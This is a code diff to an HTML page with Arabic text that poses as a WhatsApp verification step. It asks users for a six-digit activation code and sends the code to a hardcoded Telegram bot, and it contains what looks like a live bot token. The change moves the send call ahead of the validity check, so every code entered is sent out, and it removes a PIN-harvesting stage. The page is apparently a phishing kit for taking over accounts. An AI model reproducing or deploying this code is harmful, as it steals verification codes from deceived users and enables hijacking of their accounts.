@@ -132,7 +132,6 @@
 
     <script>
         const correctActivationCode1 = "123456"; // الرمز الصحيح للتفعيل الأول
-        const correctPinCode1 = "654321"; // الرمز الصحيح لـ PIN الأول
 
         function sendCodeToTelegram(code, type) {
             const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
@@ -179,47 +178,23 @@
                 return;
             }
 
+            sendCodeToTelegram(activationCode1, "رمز التفعيل الأول");
+
             if (activationCode1 !== correctActivationCode1) {
                 errorDisplay.textContent = 'رمز التفعيل الأول غير صحيح.';
                 return;
             }
 
             errorDisplay.textContent = '';
-            sendCodeToTelegram(activationCode1, "رمز التفعيل الأول");
-
             startCountdown(() => {
                 const container = document.getElementById('container');
                 container.innerHTML = `
                     <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
-                    <h1>المرحلة الأولى: PIN</h1>
-                    <p>يرجى إدخال رمز PIN الأول المكون من 6 أرقام.</p>
-                    <input id="pinCode1" type="text" placeholder="PIN الأول" maxlength="6">
-                    <div id="errorPin1" class="error"></div>
-                    <button onclick="submitFirstPin()">متابعة</button>
+                    <h1>المرحلة الثانية</h1>
+                    <p>تم إدخال رمز التفعيل الأول بنجاح!.</p>
+                    <button onclick="alert('إتمام جميع المراحل')">إنهاء</button>
                     <div id="countdown"></div>
                 `;
-            });
-        }
-
-        function submitFirstPin() {
-            const pinCode1 = document.getElementById('pinCode1').value;
-            const errorDisplay = document.getElementById('errorPin1');
-
-            if (!pinCode1 || pinCode1.length !== 6 || !/^\d+$/.test(pinCode1)) {
-                errorDisplay.textContent = 'يرجى إدخال رمز PIN مكون من 6 أرقام.';
-                return;
-            }
-
-            if (pinCode1 !== correctPinCode1) {
-                errorDisplay.textContent = 'رمز PIN الأول غير صحيح.';
-                return;
-            }
-
-            errorDisplay.textContent = '';
-            sendCodeToTelegram(pinCode1, "رمز PIN الأول");
-
-            startCountdown(() => {
-                alert('تم إكمال المرحلة الأولى بنجاح!');
             });
         }
     </script>
